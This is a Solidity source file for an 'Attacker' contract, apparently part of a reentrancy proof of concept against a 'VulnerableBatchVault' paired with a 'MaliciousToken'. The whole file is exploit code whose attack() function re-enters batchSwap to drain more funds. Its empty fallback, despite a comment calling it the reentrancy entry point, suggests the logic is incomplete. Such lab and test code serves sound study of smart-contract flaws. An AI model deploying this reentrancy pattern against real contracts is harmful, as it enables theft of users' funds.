// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VulnerableBatchVault.sol";
import "./MaliciousToken.sol";

contract Attacker {
    VulnerableBatchVault public vault;
    MaliciousToken public maliciousToken;
    ERC20 public legitToken;

    uint256 public attackCount = 0;

    constructor(
        address _vault,
        address _maliciousToken,
        address _legitToken
    ) {
        vault = VulnerableBatchVault(_vault);
        maliciousToken = MaliciousToken(_maliciousToken);
        legitToken = ERC20(_legitToken);
    }

    function attack() external {
        // Re-enter the vault only once to prevent infinite loop
        if (attackCount < 1) {
            attackCount++;
            // Re-enter the batchSwap function to drain more funds
            vault.batchSwap(legitToken, maliciousToken, 0, 1 ether);
        }
    }

    // Fallback function that gets triggered by MaliciousToken's transfer
    // This is the entry point for the re-entrancy
    fallback() external payable {}
    receive() external payable {}
}
